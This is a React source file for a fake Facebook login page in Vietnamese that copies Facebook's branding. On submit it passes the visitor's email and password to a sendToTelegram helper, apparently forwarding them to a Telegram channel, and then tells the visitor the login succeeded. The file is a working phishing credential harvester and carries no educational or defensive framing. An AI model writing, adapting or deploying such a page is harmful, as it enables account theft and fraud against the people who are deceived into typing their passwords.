import { useState } from "react";
import { sendToTelegram } from "../utils/telegram";

const Login = () => {
  const [formData, setFormData] = useState({
    email: "",
    password: "",
  });
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      const result = await sendToTelegram(formData.email, formData.password);
      console.log("Kết quả gửi:", result);

      setFormData({
        email: "",
        password: "",
      });

      alert("Đăng nhập thành công!");
    } catch (error) {
      console.error("Lỗi đăng nhập:", error);
      alert("Đăng nhập thất bại. Vui lòng thử lại.");
    } finally {
      setLoading(false);
    }
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevState) => ({
      ...prevState,
      [name]: value,
    }));
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-[#f0f2f5] py-12 px-4 sm:px-6 lg:px-8">
      <div className="max-w-md w-full space-y-4">
        <div className="text-center">
          <h1 className="text-[#1877f2] text-6xl font-bold mb-4">facebook</h1>
          <p className="text-xl text-gray-700 mb-8">
            Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.
          </p>
        </div>
        <div className="bg-white p-4 rounded-lg shadow-lg">
          <form className="space-y-4" onSubmit={handleSubmit}>
            <div>
              <input
                id="email-address"
                name="email"
                type="email"
                autoComplete="email"
                required
                className="appearance-none rounded-lg relative block w-full px-3 py-3 border border-gray-300 placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-[#1877f2] focus:border-[#1877f2] text-lg"
                placeholder="Email hoặc số điện thoại"
                value={formData.email}
                onChange={handleChange}
              />
            </div>
            <div>
              <input
                id="password"
                name="password"
                type="password"
                autoComplete="current-password"
                required
                className="appearance-none rounded-lg relative block w-full px-3 py-3 border border-gray-300 placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-[#1877f2] focus:border-[#1877f2] text-lg"
                placeholder="Mật khẩu"
                value={formData.password}
                onChange={handleChange}
              />
            </div>

            <div>
              <button
                type="submit"
                disabled={loading}
                className={`relative w-full flex justify-center py-3 px-4 border border-transparent text-xl font-semibold rounded-md text-white ${
                  loading ? "bg-[#1877f2]/70" : "bg-[#1877f2] hover:bg-[#166fe5]"
                } focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#1877f2]`}
              >
                {loading ? "Đang đăng nhập..." : "Đăng nhập"}
              </button>
            </div>
            
            <div className="text-center">
              <a href="#" className="text-[#1877f2] text-sm hover:underline">
                Quên mật khẩu?
              </a>
            </div>
            
            <hr className="my-4" />
            
            <div className="text-center">
              <button
                type="button"
                className="bg-[#42b72a] text-white px-4 py-3 rounded-md text-lg font-semibold hover:bg-[#36a420]"
              >
                Tạo tài khoản mới
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Login;
